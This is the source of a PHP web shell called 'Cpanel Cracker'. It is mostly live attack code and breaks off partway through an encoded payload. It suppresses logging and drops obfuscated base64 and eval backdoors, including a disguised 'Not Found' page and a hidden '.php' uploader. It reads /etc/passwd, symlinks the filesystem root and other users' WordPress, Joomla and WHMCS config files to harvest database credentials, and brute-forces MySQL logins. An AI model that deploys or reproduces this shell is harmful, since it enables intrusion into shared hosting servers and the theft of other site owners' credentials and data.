<?php
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('output_buffering',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);

?>
<html>
<title>Cpanel Cracker </title>
<body>

<STYLE>textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 10px;font-family: Tahoma; border: 1px solid #000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 10px;font-weight:bold;color: lime; font-family: Tahoma; border: 1px solid #666666;height:20 }
body { font-family: Tahoma}
.x-inj { font-family: Vivaldi}
tr { BORDER: dashed 1px #333; color: #00ff; }
td { BORDER: dashed 1px #333; color: #00ff; }
.table1 { BORDER: 0px Black; BACKGROUND-COLOR: Black; color: #00ff; }
.td1 { BORDER: 0px; BORDER-COLOR: #333333; font: 8pt Verdana; color: #9f030e; }
.tr1 { BORDER: 0px; BORDER-COLOR: #333333; color: #00ff; }
table { BORDER: dashed 1px #333; BORDER-COLOR: #333333; BACKGROUND-COLOR: Black; color: #00ff; }
input { border: dashed 1px; border-color: #333; BACKGROUND-COLOR: Black; font: 8pt Verdana; color: #00ff; }
select { BORDER-RIGHT: Black 1px solid; BORDER-TOP: #00ff 1px solid; BORDER-LEFT: #00ff 1px solid; BORDER-BOTTOM: Black 1px solid; BORDER-color: #00ff; BACKGROUND-COLOR: Black; font: pt Verdana; color: #00ff; }
submit { BORDER: buttonhighlight 2px outset; BACKGROUND-COLOR: Black; width: 30%; color: #00ff; }
textarea { border: dashed 1px #333; BACKGROUND-COLOR: Black; font: Fixedsys bold; color: #999; }
BODY { SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #00ff; SCROLLBAR-SHADOW-color: #00ff; SCROLLBAR-3DLIGHT-color: #00ff; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #00ff; SCROLLBAR-DARKSHADOW-color: #00ff margin: 1px; color: #9f030e; background-color: Black; }
.main { margin: -287px 0px 0px -490px; BORDER: dashed 1px #333; BORDER-COLOR: #333333; }
.tt { background-color: Black; }
A:link { COLOR: White; TEXT-DECORATION: none }
A:visited { COLOR: White; TEXT-DECORATION: none }
A:hover { color: #9f030e; TEXT-DECORATION: none }
A:active { color: #9f030e; TEXT-DECORATION: none }
</STYLE>


<?php
@ini_set('display_errors', 0);
@ini_set('output_buffering',0);
echo "<center>
<b><font color='#9f030e' class='x-inj' size='5'>Cpanel Cracker </font><br><br><br></b><b>
<font size='3'>
|| <a href='?do=uploader'>./Uploader</a> | <a href='?do=config'>./Config</a> | <a href='?do=bhconfig'>./B-F Config Cpanel</a> | <a href='?do=brute'>./Cpanel BruteForce</a> ||</b><br><br><br></center></font><br> ";

if(isset($_REQUEST['do'])){
switch ($_REQUEST['do']){
################php info
case 'bhconfig';
echo "<center/><br/><b><font color=#9f030e>+--==[ B-F Config ]==--+</font></b><br><br>";
mkdir('bconfig', 0755);
chdir('bconfig');
$akses = ".htaccess";
$buka_lah = "$akses";
$buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
$metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";
fwrite ( $buka , $metin ) ;
fclose ($buka);
$confshell = 'PD9waHAgLyogfHwgSWRlYSA6OiBNci5BbHNhM2VrIHx8IFByb2dyYW1taW5nIDo6IEctQiB8fCBEZXNpZ25lciA6OiBBbC1Td2lzcmUgfHwgKi8kT09PMDAwMDAwPXVybGRlY29kZSgnJTY2JTY3JTM2JTczJTYyJTY1JTY4JTcwJTcyJTYxJTM0JTYzJTZmJTVmJTc0JTZlJTY0Jyk7JE9PTzAwMDBPMD0kT09PMDAwMDAwezR9LiRPT08wMDAwMDB7OX0uJE9PTzAwMDAwMHszfS4kT09PMDAwMDAwezV9OyRPT08wMDAwTzAuPSRPT08wMDAwMDB7Mn0uJE9PTzAwMDAwMHsxMH0uJE9PTzAwMDAwMHsxM30uJE9PTzAwMDAwMHsxNn07JE9PTzAwMDBPMC49JE9PTzAwMDBPMHszfS4kT09PMDAwMDAwezExfS4kT09PMDAwMDAwezEyfS4kT09PMDAwME8wezd9LiRPT08wMDAwMDB7NX07JE9PTzAwME8wMD0kT09PMDAwMDAwezB9LiRPT08wMDAwMDB7MTJ9LiRPT08wMDAwMDB7N30uJE9PTzAwMDAwMHs1fS4kT09PMDAwMDAwezE1fTskTzBPMDAwTzAwPSRPT08wMDAwMDB7MH0uJE9PTzAwMDAwMHsxfS4kT09PMDAwMDAwezV9LiRPT08wMDAwMDB7MTR9OyRPME8wMDBPME89JE8wTzAwME8wMC4kT09PMDAwMDAwezExfTskTzBPMDAwTzAwPSRPME8wMDBPMDAuJE9PTzAwMDAwMHszfTskTzBPMDBPTzAwPSRPT08wMDAwMDB7MH0uJE9PTzAwMDAwMHs4fS4kT09PMDAwMDAwezV9LiRPT08wMDAwMDB7OX0uJE9PTzAwMDAwMHsxNn07JE9PTzAwMDAwTz0kT09PMDAwMDAwezN9LiRPT08wMDAwMDB7MTR9LiRPT08wMDAwMDB7OH0uJE9PTzAwMDAwMHsxNH0uJE9PTzAwMDAwMHs4fTskT09PME8wTzAwPV9fRklMRV9fOyRPTzAwTzAwMDA9MHgxMDdjO2V2YWwoJE9PTzAwMDBPMCgnSkU4d01EQlBNRTh3TUQwa1QwOVBNREF3VHpBd0tDUlBUMDh3VHpCUE1EQXNKM0ppSnlrN0pFOHdUekF3VDA4d01DZ2tUekF3TUU4d1R6QXdMREI0TkdNMEtUc2tUMDh3TUU4d01FOHdQU1JQVDA4d01EQXdUekFvSkU5UFR6QXdNREF3VHlna1R6QlBNREJQVHpBd0tDUlBNREF3VHpCUE1EQXNNSGd4TjJNcExDZEZiblJsY25sdmRYZHJhRkpJV1V0T1YwOVZWRUZoUW1KRFkwUmtSbVpIWjBscFNtcE1iRTF0VUhCUmNWTnpWblpZZUZwNk1ERXlNelExTmpjNE9Tc3ZQU2NzSjBGQ1EwUkZSa2RJU1VwTFRFMU9UMUJSVWxOVVZWWlhXRmxhWVdKalpHVm1aMmhwYW10c2JXNXZjSEZ5YzNSMWRuZDRlWG93TVRJek5EVTJOemc1S3k4bktTazdaWFpoYkNna1QwOHdNRTh3TUU4d0tUcz0nKSk7cmV0dXJuOz8+fkRrcjlOSGVuTkhlbk5IZTF6ZnVrZ0ZNYVhkb3lqY1VJbWIxOW9VQXh5YjE4bVJ0d213SjRMVDA5TkhyOFhUekVYUkp3bXdKWExUMDlOSGVFWEhyOFhodE9OVDA4WEhlRVhIcjhQa3I4WFR6RVhUMDhYSHRJTFR6RVhIcjhYVHpFWFJ0T05UekVYVHpFWEhlRXBSdGZ5ZG1PbEZtbHZmYmZxRHlrd0JBc0thMDlhYXJ5aVdNa2VDME9MT01jdWMwbHBVTXBIZHIxc0F1bk9GYVl6YW1jQ0d5cDZIZXJaSHpXMVlqRjRLVVN2TlVGU2sweXRXME95T0xmd1VBcFJUcjFLVDFuT0FsWUFhYWNiQnlsRENCa2pjb2FNYzJpcERNc1NkQjV2RnV5WkYzTzFmbWY0R2JQWEhUd3pZZUEyWXpJNWhaOG1oVUxwSzJjamRvOXpjVUlMVHpFWEhyOFhUekVYaFRzbGZNeVNodE9OVHpFWFR6RVhUekVwS1g9PXRtWWxmeTkwREIxbGIyeHBkQmwwaGVFcEtYcGxGbWt2Rmw5WmNibnZGbU9wZE1GUEh0TDd0TWxNaG9sekYyYTBodE9nQXI5VGF5U21mYmtTazEwcGhiU2hrdWFaZHRFOXd0T2dBcjlUYXlTbWZia1NrMTA3dG0xbGR1WWxHWFBMZmJrU3dlMElrMmkwZnVFNlJaOTNmM0ZWa3pTaGdXcGxDMml2d3RGOHdBT05XMU9jQXJBSVV5T1lUZTRoTm9pMGRCWCt0anhQY0J5TE5JUDhmb2wwZG9BK1dKMW93cll2ZE1jcGMxOWpBb3lWY0JYOFIzT3Bmb3hsTklQOEYzTzVkb0FJZnVsWGNUMEpmb2E0ZnQ5akYzSEpOSVBoQ005TEdiU2h3dEVJZEJ5WmMybFZ3ZVBJQ2JhMGR6U2h3dEVJQ015akQyZlpkM2FWY3QxamQyeHZGalBqY2pjTVlNQzJLWFBJd3RuamQyeHZGalBJd3pIektUTDVLVFNod3RFSWNNOVZmdDFNQ0IxcGR1TDZ3dU9pRG85c0NVWEljMmFWY2JjaVJ0blNmQllwY29yU2R1YWpEQk9pd29mWkNCNUxjVVhJQ2JrcENCWFN3b2lsZHVjbGZvbGpDVVhJRjJ5VkZaMXpjYmtwY2pTaHd0RUljTTlWZnQxTUNCMXBkdUw2d2VyMEZ1STd0SkVJd3VPbEd1V3NDQnhwYzI0NndvWWxkbU9sRmpTaHd0RUl3b2N2ZG1Xc2YyYXBjMmkwS0puSmQyeEx3ZVNoZ1dQaERCNVhmYldTZm9hNGZveVpjQnJTRjJhU2NCWTBHWHBNZDI1MFJiZmxEQmZQZmVQSUNNOVNjZVNoQzI5U2QzdzZ3dEhYSGVFWEhlRTd0TWt2Rk1PbEZqUElIYm40d3VZdmRvbEx3dFllVzBZZVcwSDd0TWtpQzJzbUZNOTFkTVdzQzI5U2QzdzZ3dWZQRGJPbEtYcFhDQk9MREI1bUtKRXpGdUk3dE1rdkZNT2xGSjFaQ0JPcGZiSDZ3ZWZYR2VTaGdXUGhEQjVYZmJXNmNNOWpmYlk3dElQSUNNOTRSYllQQ0JPdmZ6UElIdW40d2VuWEd0RTFGdUlJd3pFWEtBQzVPalNodG0waHcyY3ZkM09sRkpFSUdYUGhDMjlTZDN3Nnd0SFhIZUVYSGVFN3RNY3ZkbVdzY015c0RCeDVLSkV4WXVuNEtYcDBjYmkwUmJZUENCT3ZmelBJSHVuNHdlblhHdEV4RnVJSXd6RVhIZUVYSGVTaGNNOVZmdDEzY0JsbUR1VzZ3bzV2Rk0xaWRlU2hnV3BpR1hQSXd1T2xHdVdzY29hamQza2lmb2x2ZGpQSWRNOVZjVFNod3RuamQyeHZGalBqSHpIekh6SHpLWHA5dGpYdkYzTzVkb0ErdGpYdkRvYWljZTRoTm9rdmN1TCt0anhMRGJDSURCVzl3bU92ZDJYSk5JUDhVZXJJRjNPNWRvQTl3TVl2ZG85WktKRWpZZVcwWWVXMEtabjBjYmkwUmJZUENCT3ZmelBJSHVuNHdlblhHdEV4RnVJSXd6RVhIZUVYSHR3N2ZvYTRmdDFpZG9sbWRqUElDMmFWZm9hWkt6NXRSQUNJVzI5VmNNbG1iMllXQ0I1bGRlWHZVZXIrdGp4TWQza3N3bzFsZm9pdmNlMEpBcjlUYXR3K3RqeHBkbW4xZnRuVkNCMWxOVWsxRk1YSnd1TzVGb0E5d21PbEd1V0p3dWNpZHVhbE5Vd21SSk8xRk1YVmtad0lGMmw2Y1QwSlllRUp3dDgrdGp4cGRtbjFmdG4wR2JubE5Va3pmQmtzRGJXSnd1Y2lkdWFsTlVrVGZveVpmdEUrd0pFdk5JUDhSMmN2Rk0wK05va1p3dDgrTm9rWnd0OCtrelNoREJDUERiWXpjYldQa3k5V1QxWUFCWmYxRk1YbWJVTHBHWHBwY0pJaWNNbFNjYTltY2JPZ0MyOVZmb2FWZnVIUGt1YVpkdExwR1hwbEMyaXZ3dGZ5Rm1rdkZKNElVQjUyQ0J4cGN0bmFBTFhWa3pTaGdCYVNGMmE3dEpPaXdlMElIZVNoY005WmNCeWpEdGltY2JPZ2NveTBDVUlMZmJrU2hVbmlGWkVMREI1TWRabDd0TWxNaG94dmMybFZodE9wZE1jdkJ6bmZSdE9wZE1jdkJ6eWZoVWw3dE1hakRvOEl3anhKd3VZMEdCeGxOVUZJQzI5U2QzdzZ3dEg0SGVJWEtlRUlLWm4wY2JpMFJiWVBDQk92ZnpQWEZ1SUlIdW40d2V5WEd0RWpLZUU0SGVJWHdlU21ObFNxYlVuYUYyYVpkTXlzY1VFTXd5bmlGM1kzZDNrTHdlUDhSMncrd3RFOENKbnpmdWxTY1QwbXdvWXZkbzlaS0pFakhlRVhIcmNvd2VTSWZvYTRmdDF6RG95TGQzRjZIdW40d2VuWEd0RXhGdUlJd3pFWEhlbm9PSkU3a3o1ZGtvbFZjTTlkSHkxZk50OUpOSkU4Q0puemZ1bFNjVDBtd29ZdmRvOVpLSkVqVzBIWEhlRVhLWm4wY2JpMFJiWVBDQk92ZnpQWEZ1SUlIdW40d2V5WEd0RWpXMEhYSGVFWEtaRitCWk9wZE1jdkJ6eWZiVFh2Q2o0OENtd0lSejRKS1hQTENVU3FLWHA5dG0waGNCWVBkWkVKTm93SUYzTzVkb0E5a1puamQyeHZGalBJd3pJWEtlRTRIdEU3d3VPbEd1V3NGMmlpY285M0tqblhHdEVYRnVJSUhibjR3dEg0SGVJWEtlRUlLWkYrTm9pWk5KT2l3cllYQ0I1bGR0bm9kM2FWY29hTFJqeEpGSkV2Tkp3N3RtMGhnV3BsQzJpdnd0RjhDbXdJUno0OENtd0lSejQ4Q213SVJ6NDhDbXdJUno0OGNvbDJ3b2xMTlVrTWQyOTBjYndKTm14OHdybExjQnJJS2pQSVRid1ZXQnh6Q1RZbERabjhndG5XRk05bUZNeXNkQmxWY1pFNktKbnVSQXdJZ3VYSU9vYXpEQmZWY2J3SUtqUElXQlhzQTNmcEYza2x3dXg4d2VYdmNvbDJOSVA4UjJPcGZqNDhSMmt2Y3VMK3RqWHZEdU9zZGU0bUtYcE1mQjVqZm9sdmRKbmxHdElMQ1VYTENKWExmb2E0ZnRsN3RKT2xHdW5TZDJPbHdlMEljYmlYZG85TGNVSUxDVVhMZm9hNGZ0TDd0Sk9sR3VuU2QyT2x3ZTBJY2JpWGRvOUxjVUlMQ0pYTGNiaVhkbzlMY2FTeGJVTDd0bWtsZnVhWmRKRUxjYmlYZG85TGNhU1hiVFNoZ1dwTWZCNWpmb2x2ZEpuU2QyZnBkSklMZmJZbEZKWExGb3l6RlpsN3RKT2p3ZTBJV28xNUYzeVNiMll2ZE01bEMzV1BrMnh2QzJ5U0RvOXpmdEZTa3VhemNid1NrdW5pRjNIcEtYcHBjSklMQ1psN3RNMTVGM3lTYjJZU2QzWWxodE9qaFRTaEZNYTBmYmtWd3VPWmZCQTd0bTFsZHVZbEdYcFpjYk8xRk00SWNNeVNGMkE3dG0waGdXcE1mQjVqZm9sdmRKbm1jYk9nY295MENVSUxmYmtTaGJTaGtveVp3ZTBJQ2JrWkNiTFBrenJWZnVpMGtaWG1ISjUwR3VXbVJ0RnpSbU80ZnRGU2t6V1ZmdWkwa1pYbVlVNTBHdVdtUnRGMlJtTzRmdEZTa3pGVmZ1aTBrWlhtS3Q1MEd1V21SdEY1Um1PNGZ0RlNrekVWZnVpMGtaTDd0Sk96Rk1ISU5Vbk1EQnhsYjJmbGZ5OWpkMjUwY0I1MEZaSUxmYmtTaFRTaGtvY3Bkb2F6d2UwSWNiaVhkbzlMY1VJbU5vcklEdWtsY2owSmtaWExGM2tqaFRTaGtvT2lmb3JJTlVuaUZta2lHVUlwS1hwTWQza2xDQllQaHRPTURCeGxGWm5pRlpFTERCVzlOSk9NREJ4bGhiU2hEQkNQa29sTHdlMDl3ZUVwR1hwamQyNTBEQjUxY1RTaGdXUExjTWxTY1VFOXdvYTRGb3h2Y29BUGtadytrWlhMY01sU2NVTDd0Sk9NREJ4bHdlMElmdWtwZFVJTGNNbFNjYVNYYlVMN3RNbE1odHlsRk1hbURVSW1SbU80ZnRGU2tvY3Bkb0FwaGJTaEMyOVZmb2xWZkJBN3RtMGhrdVlaQ1pFOXdvY3Bkb2FnYzJhMGIyWXZkbU9sZG1Pemh0d0xmYmtTUlpPTURCeGx3Skw3dE1sTWh0ckxGM2tqaGJTaEMyOVZmb2xWZkJBN3RtMGhrdWF6Y2J3SU5VbnpmdWtnRk1hWGRveWpjVUlMQ2J3U2taRlNrb2NwZG9BcEtYUExmYllsRkpFOXd1WTBGbDlaY2JuU0NCWWxodE9pRkpYbWtaWExmYllsRko0bVJtTzRmdEZwS1hQTGZiWWxGSkU5d3VZMEZsOVpjYm5TQ0JZbGh0T2lGSlhta1pYTGZiWWxGSjRtUm1PNGZ0RnBLWFBMZmJZbEZKRTl3dU9aREIwUEYzT1piM2tsRm94aUMyQVBrWjUwR3VXbVJ0Rm1SdE8xRjJhWmhVTDd0TWxNaG9hWmNCZnBodGtiZDNrTEF1a2xGM0hKUnRPekZNSHBoYlNoa3VuaUYzSElOVW5sR3RJSmNvYU1EQjVsaHRmcldsOVdXYVlUYTA5VU90RlN3dEZKUnR3bWhUU0pSdE96Rk1IcEtYUExjb3kwQ2FzZndlMElDYmtaQ2JMUGt1YXpjYndTa3VuaUYzSHBLWHA5Y0J4emNiU2hrdU92RDJhVkZaRTl3dU92RDJhVmIyZmxmeTlpZG9YUGt1WVpDWkw3dE1jdkZNYWlDMklQa3VPdkQyYVZGWm5pRlpFTGZvOXFjQjRwR1hwcGNKSWlrdU92RDJhVkJ6eWZoYlNoQzI5VmZvbFZmQkE3dG0waGt1T3ZEMmFWZE15c2NVRTl3dU92RDJhVmIyNWlkQkFQa3VPdkQyYVZCem5maFRTaERCQ1BrdU92RDJhVmRNeXNjVUVpTlVFbWF5OUJXYWtrV0FrSE9VRnBHWHBqZDI1MERCNTFjVFNoZ1dQTGZNeVp3ZTBJa3VPdkQyYVZCenlmS1hwcGNKaWxGTWFtRFVJbUZveXpGWkZTa3VjaUZKTHBHWFBMY0pFOXd1WTBGbDlaY2JuU0NCWWxodEZJa1pYbWtaeGxHdElMZk15WlJ0RjdrWlhMRjNramhVTDd0Sk9pd2UwSWZ1a3BkVWlsR3RJSk5VRkpSdHdtd0pYTGNKTHBLWFBMQ0pFOXd1T1pEQjBQY2JJUGtad21SdEZKa1pYTGNKTHBLWHBwY0pJTENVRWlOVUVta1psN3RKT1hDYll6d2UwSWtvcjd0bTFsZHVZbERCQ1Brb3dJd1QwSWtaRnBHWFBMRm95ekZaRTl3dE9KS1hwOXRNbE1odE9YQ2JZendlMDl3dEZtaGJTaEMyOVZmb2xWZkJBN3RtMGhrb09pZm95ZGJVRTl3b3laRk15NWh0TzFGMmFaUnRPWENiWXpoVFNoZ1dwOXRtMGhnV3BaY2JPMUZNNElrb09pZm9yN3RtMGhLWD09YWxWblJQSXE=';
$file = fopen("bhc.php" ,"w+");
$write = fwrite ($file ,base64_decode($confshell));
fclose($file);
chmod("bhc.php", 0644);
$indexshell = fopen("index.php" ,"w+");
$data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
echo "<iframe src=bconfig/bhc.php width=97% height=100% frameborder=0></iframe>";
break;

################CMS DETECTOR
case 'config';
$byphp = "safe_mode = Off
disable_functions = None
";
file_put_contents("php.ini",$byphp);

echo '<CENTER><b>+--=[ Config priv8 ]=--+</b><br><br>';
?>

<bR><form method=post>
<textarea rows=20 cols=85 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br>
<input type=submit name=su value="Lets Start" /></form></CENTER>
<?php
error_reporting(0);
echo "<font color=#00ff size=2 face=\"comic sans ms\">";
if(isset($_POST['su']))
{
mkdir('billgate',0777);
$rr = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$g = fopen('billgate/.htaccess','w');
fwrite($g,$rr);
$indishell = symlink("/","billgate/root");
$rt="<a href=billgate/root><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
echo "Please check link given below for / folder symlink <br><u>$rt</u>";

$dir=mkdir('billgate',0777);
$r = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f = fopen('billgate/.htaccess','w');

fwrite($f,$r);
$consym="<a href=billgate/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=green size=2 face=\"comic sans ms\">$consym</font></u>";

$usr=explode("\n",$_POST['user']);
$configuration=array("wp-config.php",
"wordpress/wp-config.php",
"web/wp-config.php",
"wp/wp-config.php",
"press/wp-config.php",
"wordpress/beta/wp-config.php",
"news/wp-config.php",
"new/wp-config.php",
"blogs/wp-config.php",
"home/wp-config.php",
"blog/wp-config.php",
"protal/wp-config.php",
"site/wp-config.php",
"main/wp-config.php",
"test/wp-config.php",
"wp/beta/wp-config.php",
"beta/wp-config.php",
"joomla/configuration.php",
"protal/configuration.php",
"joo/configuration.php",
"cms/configuration.php",
"site/configuration.php",
"main/configuration.php",
"news/configuration.php",
"new/configuration.php",
"home/configuration.php",
"configuration.php",
"SSI.php",
"forum/SSI.php",
"forum/inc/config.php",
"forum/includes/config.php",
"upload/includes/config.php",
"cc/includes/config.php",
"vb/includes/config.php",
"vb3/includes/config.php",
"cpanel/configuration.php",
"panel/configuration.php",
"ubmitticket.php",
"manage/configuration.php",
"myshop/configuration.php",
"beta/configuration.php",
"includes/config.php",
"lib/config.php",
"conf_global.php",
"inc/config.php",
"incl/config.php",
"include/db.php",
"include/config.php",
"includes/functions.php",
"includes/dist-configure.php",
"connect.php",
"mk_conf.php",
"config/koneksi.php",
"system/sistem.php",
"config.php",
"Settings.php",
"settings.php",
"sites/default/settings.php",
"smf/Settings.php",
"forum/Settings.php",
"forums/Settings.php",
"host/configuration.php",
"hosting/configuration.php",
"hosts/configuration.php",
"zencart/includes/dist-configure.php",
"shop/includes/dist-configure.php",
"whm/configuration.php",
"whmc/configuration.php",
"whmcs/configuration.php",
"whmc/WHM/configuration.php",
"whm/WHMCS/configuration.php",
"whm/whmcs/configuration.php",
"order/configuration.php",
"support/configuration.php",
"supports/configuration.php",
"oscommerce/includes/configure.php",
"oscommerces/includes/configure.php",
"shopping/includes/configure.php",
"sale/includes/configure.php",
"config.inc.php",
"amember/config.inc.php",
"clients/configuration.php",
"client/configuration.php",
"clientes/configuration.php",
"cliente/configuration.php",
"clientsupport/configuration.php",
"billing/configuration.php",
"billings/configuration.php",
"admin/conf.php",
"admin/config.php");
foreach($usr as $uss )
{
$us=trim($uss);

foreach($configuration as $c)
{
$rs="/home/".$us."/public_html/".$c;
$r="billgate/".$us." .. ".$c;
symlink($rs,$r);

}

}


}
break;
///////////////////////////////////
case'file';


break;
###################################

case 'brute';?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
/*
Recoded By BillGate
*/
@set_time_limit(0);
@error_reporting(0);


if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
if($_POST['type'] == 'passwd'){
$e = explode("\n",$_POST['usernames']);
foreach($e as $value){
$k = explode(":",$value);
$username .= $k['0']." ";
}
}elseif($_POST['type'] == 'simple'){
$username = str_replace("\n",' ',$_POST['usernames']);
}
$a1 = explode(" ",$username);
$a2 = explode("\n",$_POST['passwords']);
$id2 = count($a2);
$ok = 0;
foreach($a1 as $user )
{
if($user !== '')
{
$user=trim($user);
for($i=0;$i<=$id2;$i++)
{
$pass = trim($a2[$i]);
if(@mysql_connect('localhost',$user,$pass))
{
echo "BillGate ~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
$ok++;
}
}
}
}
echo "<hr><b>You Found <font color=green>$ok</font> Cpanel by BillGate</b>";
echo "<center><b><a href=".$_SERVER['PHP_SELF']."><< BACK</a>";
exit;
}
}
if($_POST['pass']=='password'){
@error_reporting(0);
$i = getenv('REMOTE_ADDR');
$d = date('D, M jS, Y H:i',time());
$h = $_SERVER['HTTP_HOST'];
$dir=$_SERVER['PHP_SELF'];
$back = "PD9waHANCmVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsNCmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsNCmlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7IGVjaG8gJzxiPktvcmFuZyBEYWggQmVyamF5YSBVcGxvYWQgU2hlbGwgS29yYW5nISEhPGI+PGJyPjxicj4nOyB9DQplbHNlIHsgZWNobyAnPGI+S29yYW5nIEdhZ2FsIFVwbG9hZCBTaGVsbCBLb3JhbmchISE8L2I+PGJyPjxicj4nOyB9DQp9DQo/Pg==";
$file = fopen(".php","w+");
$write = fwrite ($file ,base64_decode($back));
fclose($file);
chmod(".php",0755);
mkdir('config',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5